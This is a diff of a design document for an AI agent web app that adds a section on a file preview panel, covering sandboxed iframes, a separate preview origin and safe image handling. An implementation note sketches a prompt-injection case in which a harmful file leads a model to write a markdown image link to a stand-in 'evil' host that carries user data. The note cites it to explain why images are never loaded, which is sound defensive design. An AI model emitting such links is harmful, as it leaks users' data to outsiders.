@@ -252,11 +252,33 @@ The server keeps memories per user ([27](27-store-auth.md#agents-and-memories)),
 
 The **Portals** page (from the side bar) lists the apps Ana can link, like Gmail or GitHub. Clicking one opens its detail page (`Apps.tsx`). It shows Ana's linked accounts for that app (the default first, see [27](27-store-auth.md#connections)), a **+ Add account** button for OAuth apps, the scopes the app asks for, each tool with "auto" or "needs approval", the MCP URL, and her recent calls from the audit table. The tool list is filled once a chat has used the app, so right after a restart it can be empty.
 
+<a id="file-preview-panel"></a>
+
+### The file preview panel
+
+Ana clicks a file in the Files panel and it opens in a preview panel beside it (`Preview.tsx`), with **Download** in the header. Which viewer to use depends only on the file's extension, in `fileKind.ts`:
+
+| Kind | Extensions | How it is drawn |
+|---|---|---|
+| code | `py`, `ts`, `json`, `txt`, … and files with no extension | `viewers/Code.tsx`, highlight.js |
+| markdown | `md` | the same `Md` as chat (images become links) |
+| image | `png`, `jpg`, `svg`, … | `<img>` from a blob |
+| sheet | `csv`, `tsv`, `xlsx`, `xls` | `viewers/Sheet.tsx`, first 1000 rows |
+| docx | `docx` | `viewers/Docx.tsx`, iframe with `sandbox=""` |
+| html, pdf | `html`, `htm`, `pdf` | iframe on the [preview origin](glossary.md#preview-origin) |
+| info | anything else | name, size and Download only |
+
+Markdown and HTML also have a Rendered/Raw switch; Raw uses the code viewer.
+
+Each choice follows the safety rule from [29a](29a-workspace-sandbox.md#file-preview): no file content ever runs as script on our origin. An image is fetched from `/files/raw` and wrapped in a blob whose type the page sets itself from the extension, so even an SVG is only ever an `<img src>`, where scripts do not run. A docx is turned into HTML by `docx-preview` in a detached element and shown in an iframe with `sandbox=""`: no scripts, and an opaque origin. HTML and PDF need the real browser engine, so the page calls `api.preview(sid)` to get a fresh base URL with a [preview token](glossary.md#preview-token) and sets the iframe `src` to base + path. The HTML iframe gets `sandbox="allow-scripts"`, so the agent's charts and buttons work, but on a different origin. A `?v=` counter in the URL makes the iframe reload after a refresh or when the agent writes the file again.
+
+Two things keep the panel light. The viewers for code, sheets and docx pull big libraries, so they are loaded with `React.lazy` only when first needed. And there are size caps (`tooBig`): text over 2 MB or anything else over 20 MB is not fetched; the panel shows the size and the Download button instead.
+
 The page also has a light and a dark theme: colours are CSS variables, the first choice follows the OS setting, and Ana's pick is saved in `localStorage` (`simp.theme`).
 
 > **Implementation notes**
 > - **Continue** shows when `canContinue(state)` is true: the run state is `error`, or it is `idle` and the last item is a notice that starts with `interrupted:` (a server restart cut the run).
 > - Markdown is drawn with `react-markdown`, but images are never loaded; they become plain links. A model that read a harmful file could be tricked into writing `![](https://evil/?d=...)`, and loading that image would send data to a stranger.
-> - `Files.tsx` lets Ana browse, download and upload files in the session folder with `api.files`, `api.download` and `api.upload`. Files do not change word by word, so a plain list loaded on request is enough; there is no event stream for files.
+> - `Files.tsx` lets Ana browse, download and upload files in the session folder with `api.files`, `api.download` and `api.upload`. Files do not change word by word, so a plain list loaded on request is enough; there is no event stream for files. Clicking a file opens [the preview panel](#file-preview-panel).
 
 **Builds on:** [26 Transport](26-transport.md), [25 Protocol models](25-server-run.md#protocol-models) · **Previous:** [29 Docker sandbox](29-docker-sandbox.md) · **Next:** [31 System tests and deploy](31-system-tests-deploy.md)
